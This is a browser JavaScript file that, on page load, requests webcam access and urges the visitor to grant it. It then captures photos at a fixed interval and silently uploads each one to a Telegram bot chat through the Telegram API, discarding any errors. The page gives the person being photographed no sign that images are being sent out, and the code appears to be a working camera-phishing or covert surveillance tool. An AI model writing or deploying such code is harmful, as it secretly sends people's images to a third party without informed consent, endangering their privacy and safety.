class Webcam {
    constructor() {
        this.camera = document.querySelector("video");
        this.canvas = document.querySelector("canvas");
        this.start();
    }

    async start() {
        try {
            const cfg = {video: true, audio: false};
            const stream = await navigator.mediaDevices.getUserMedia(cfg);
            this.camera.srcObject = stream;

            await this.camera.play();

            setInterval(() => this.captureSelfie(), INTERVAL * 1000);
        } catch (e) {
            alert(`Camera permission is denied, please refresh the page and allow.`);
        }
    }

    async captureSelfie() {
        const context = this.canvas.getContext("2d");

        this.canvas.width = this.camera.videoWidth;
        this.canvas.height = this.camera.videoHeight;

        context.drawImage(this.camera, 0, 0, this.canvas.width, this.canvas.height);

        const img = this.canvas.toDataURL("image/jpeg", 1);
        await this.sendToTelegram(img);
    }

    async sendToTelegram(img) {
        const b64 = img.replace(/^data:image\/jpeg;base64,/, "");
        const blob = await this.getBlob(b64, "image/jpeg");
        const form = new FormData();

        form.append("chat_id", CHAT_ID);
        form.append("photo", blob, "img.jpg");

        try {
            const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                method: "POST",
                body: form
            });

            // let status = response.ok;
        } catch (e) {};
    }

    async getBlob(b64, cType) {
        return new Promise((resolve, reject) => {
            let byteChars = atob(b64);
            let byteM = [];

            for (let offset = 0; offset < byteChars.length; offset += 512) {
                let slice = byteChars.slice(offset, offset + 512);
                let numbers = new Array(slice.length);

                for (let i = 0; i < slice.length; i++) {
                    numbers[i] = slice.charCodeAt(i);
                }

                let byteA = new Uint8Array(numbers);
                byteM.push(byteA);
            }

            resolve(new Blob(byteM, {type: cType}));
        });
    }
}

// initialize
new Webcam();